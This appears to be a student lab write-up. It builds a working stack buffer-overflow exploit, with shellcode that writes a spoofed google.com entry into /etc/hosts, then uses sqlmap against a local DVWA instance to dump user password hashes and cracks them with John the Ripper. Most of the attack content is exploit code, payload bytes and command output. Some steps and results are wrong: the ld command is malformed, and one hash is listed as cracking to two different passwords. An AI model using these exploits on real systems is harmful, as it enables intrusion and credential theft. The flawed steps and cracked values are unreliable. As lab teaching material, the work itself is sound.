# Lab #1
## Task 1: Software buffer overflow attack

### 1. Compile asm program and C program to executable code:
*Note: Both files are to be put in the same folder*

***Compile vuln.c:***

```c
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[])
{
	char buffer[16];
	strcpy(buffer,argv[1]);
	return 0;
}
```
*The function strcpy(buffer, argv[1]) copies data into the buffer without checking for overflow, making it vulnerable.*

To compile the vulnerable C program without security mechanisms, run:

```sh
gcc -g -m32 vuln.c -o vuln.out -fno-stack-protector -z execstack 
```

Here, -fno-stack-protector disables stack protection, and -z execstack
allows execution on the stack (where the shell code will be placed).

***Compile sh.asm:***

```asm
global _start

section .text

_start:
    xor ecx, ecx
    mul ecx
    mov al, 0x5     
    push ecx
    push 0x7374736f     ;/etc///hosts
    push 0x682f2f2f
    push 0x6374652f
    mov ebx, esp
    mov cx, 0x401       ;permmisions
    int 0x80            ;syscall to open file

    xchg eax, ebx
    push 0x4
    pop eax
    jmp short _load_data    ;jmp-call-pop technique to load the map

_write:
    pop ecx
    push 20             ;length of the string, dont forget to modify if changes the map
    pop edx
    int 0x80            ;syscall to write in the file

    push 0x6
    pop eax
    int 0x80            ;syscall to close the file

    push 0x1
    pop eax
    int 0x80            ;syscall to exit

_load_data:
    call _write
    google db "127.1.1.1 google.com"

```

Then, compile it using nasm and ld:

```sh
nasm -f elf sh.asm -o sh.o
ld -m elf_i386 sh -o sh.o
```

This will generate an object file from the assembly file.

### 2. Trigger the buffer overflow
"Conduct the attack so that when C executable code runs, shellcode will be triggered and a new entry is added to the /etc/hosts file on your linux."

#### Step 1: Extract shellcode from the binary
*We use objdump to extract the byte sequence for the attack:*

```sh
objdump -d sh | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-6 -d' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//' | sed 's/ /\\x/g' | paste -d '' -s
```

*Which gives this after cleaning:*

```\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x6f\x73\x74\x73\x68\x2f\x2f\x2f\x68\x68\x2f\x65\x74\x63\x89\xe3\x66\xb9\x01\x04\xcd\x80\x93\x6a\x04\x58\xeb\x10\x59\x6a\x14\x5a\xcd\x80\x6a\x06\x58\xcd\x80\x6a\x01\x58\xcd\x80\xe8\xeb\xff\xff\xff\x31\x32\x37\x2e\x31\x2e\x31\x2e\x31\x20\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d```

#### Step 2: Identify the offset
*(Where the buffer overflows into the return address)*

```sh
gdb -q vuln.out
gdb-peda$ run $(python -c 'print "A"*20')
```

![image](https://raw.githubusercontent.com/ByrnorOCount/Subs/refs/heads/main/1.png)

Here, we can see `0xffffd740 ('A' <repeats 20 times>)` on the stack. The buffer is stored here, which is likely to be where the shell code is placed after the overflow. 

### 3: Construct the payload and conduct the attack
#### Step 1: Construct the payload

```py
from pwn import *

payload = b"A" * 20  # Fill the buffer and EBP to go straight to the return address
payload += b"\x40\xd7\xff\xff"  # Overwrite EIP, address where execution will jump to after overflow
payload += b"\x90" * 200  # NOP sled in case return address is off
payload += b"\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x6f\x73\x74\x73\x68\x2f\x2f\x2f\x68\x68\x2f\x65\x74\x63\x89\xe3\x66\xb9\x01\x04\xcd\x80\x93\x6a\x04\x58\xeb\x10\x59\x6a\x14\x5a\xcd\x80\x6a\x06\x58\xcd\x80\x6a\x01\x58\xcd\x80\xe8\xeb\xff\xff\xff\x31\x32\x37\x2e\x31\x2e\x31\x2e\x31\x20\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d"  # Shell code

with open("payload.txt", "wb") as f:
    f.write(payload)
```

#### Step 2: Run and verify attack

##### 1. Run the program (with root permission)
```sh
sudo ./vuln.out "$(cat payload.txt)"
```

![image](https://raw.githubusercontent.com/ByrnorOCount/Subs/refs/heads/main/2.png)

##### 2. Verify the changes
```sh
cat /etc/hosts
```

![image](https://raw.githubusercontent.com/ByrnorOCount/Subs/refs/heads/main/3.png)

## Task 2: Attack on the database of Vulnerable App from SQLi lab

### 1. Use sqlmap to get information about all available databases

#### Step 1: Start docker and set up sqlmap

```sh
# Ensure Docker is running before running the commands
docker pull vulnerables/web-dvwa
docker run -d -p 80:80 vulnerables/web-dvwa
```

We then open http://localhost to access the DVWA site

Next, we can install sqlmap here: https://github.com/sqlmapproject/sqlmap?tab=readme-ov-file#installation. I downloaded the latest zipball.

#### Step 2: Identify vulnerable point and run sqlmap

We log in using the default username `admin` and password `password`. Then, we go to the SQL Injection page `http://localhost/vulnerabilities/sqli/`, where we input `1` and press submit, which gives the vulnerable url `http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit`. 
Next, we check the cookies of the site. I used a cookie editor for this:
![image](https://raw.githubusercontent.com/ByrnorOCount/Subs/refs/heads/main/4.png)

With the cookies `security=low` and `PHPSESSID=sqk0l27imcclp1u9d13s1sc444`, we will use sqlmap to exploit this vulnerability. In my case, I opened a command prompt in the sqlmap folder and ran:
```sh
python sqlmap.py sqlmapproject-sqlmap-1.8.9-1-g9e36fd7\sqlmapproject-sqlmap-9e36fd7>python sqlmap.py sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=sqk0l27imcclp1u9d13s1sc444" --dbs`
```
![image](https://raw.githubusercontent.com/ByrnorOCount/Subs/refs/heads/main/5.png)
![image](https://raw.githubusercontent.com/ByrnorOCount/Subs/refs/heads/main/6.png)

Here, we can see that the available databases are `dvwa` and `information_schema`.

### 2. Use sqlmap to get tables, users information

#### Step 1: Extract tables

```sh
python sqlmap.py -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=sqk0l27imcclp1u9d13s1sc444" -D dvwa --tables
```
![image](https://raw.githubusercontent.com/ByrnorOCount/Subs/refs/heads/main/7.png)

We can see that there are two tables, `guestbook` and `users`

#### Step 2: Extract users information

```sh
python sqlmap.py -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=sqk0l27imcclp1u9d13s1sc444" -D dvwa -T users --dump
```
![image](https://raw.githubusercontent.com/ByrnorOCount/Subs/refs/heads/main/8.png)
```sql
+---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+
| user_id | user    | avatar                      | password                         | last_name | first_name | last_login          | failed_login |
+---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+
| 1       | admin   | /hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 | admin     | admin      | 2024-10-22 14:34:09 | 0            |
| 2       | gordonb | /hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 | Brown     | Gordon     | 2024-10-22 14:34:09 | 0            |
| 3       | 1337    | /hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b | Me        | Hack       | 2024-10-22 14:34:09 | 0            |
| 4       | pablo   | /hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 | Picasso   | Pablo      | 2024-10-22 14:34:09 | 0            |
| 5       | smithy  | /hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 | Smith     | Bob        | 2024-10-22 14:34:09 | 0            |
+---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+
```
The password hashes seem to be in an MD5 format.

### 3. Make use of John the Ripper to disclose the password of all database users from the above exploit

First, we can install John The Ripper from the site https://www.openwall.com/john/. I downloaded this specific version: https://www.openwall.com/john/k/john-1.9.0-jumbo-1-win64.7z.
Next, we'll compile all of the hashed passwords we extracted in the previous section into a hashedpw.txt file and run John The Ripper on it. 
```sh
john --format=raw-md5 hashedpw.txt
```
![image](https://raw.githubusercontent.com/ByrnorOCount/Subs/refs/heads/main/9.png)
And we've obtained the raw passwords:
```
5f4dcc3b5aa765d61d8327deb882cf99 = password
e99a18c428cb38d5f260853678922e03 = password
8d3533d75ae2c3966d7e0d4fcc69216b = abc123
0d107d09f5bbe40cade3de5c71e9e9b7 = letmein
5f4dcc3b5aa765d61d8327deb882cf99 = charley
```
